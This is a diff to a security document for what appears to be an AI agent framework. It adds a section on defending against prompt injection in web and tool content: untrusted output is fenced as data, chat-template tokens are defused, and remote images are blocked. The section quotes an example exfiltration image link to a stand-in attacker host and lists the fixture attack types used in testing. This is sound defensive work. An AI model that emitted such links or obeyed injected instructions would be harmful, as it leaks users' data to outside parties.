@@ -103,3 +103,13 @@ Events are written as JSON lines to `<data_dir>/logs/security.log` and also appe
 
 - Skill `permissions.network_domains`, `file_paths`, `vault_secrets` and `memory_tiers` are declared only. The scanner reads them; nothing enforces them at runtime.
 - The subprocess sandbox is not isolation. Use Firecracker, or `AGENT_HOST_EXEC=never`, if that matters.
+
+## Prompt injection through web content
+
+Web pages, search results, browser and MCP tool output can contain instructions aimed at AI assistants. Two layers:
+
+- **Fenced as data.** Results of those tools reach the model inside `<untrusted_content>` with a note that they are data, not instructions. Chat-template control tokens (`<|im_start|>`, `[INST]` and similar) are defused first, because a local model server may tokenise them as real turn markers.
+- **No remote images in replies.** The chat UI renders markdown images, so an injected `![x](https://attacker/p.png?d=…)` would make the browser send data with zero clicks. Replies show such images as text ("image not shown … external image from host") unless your own message contained the URL.
+
+Measured with fixture attack pages (overrides, fake system blocks, silent memory poisoning, data-exfiltration fetches and images, hidden endorsements, malicious install commands): held-out attacks that succeeded went from 4/18 to 0/18, and the user's actual request was handled 18/18 instead of 14/18.
+
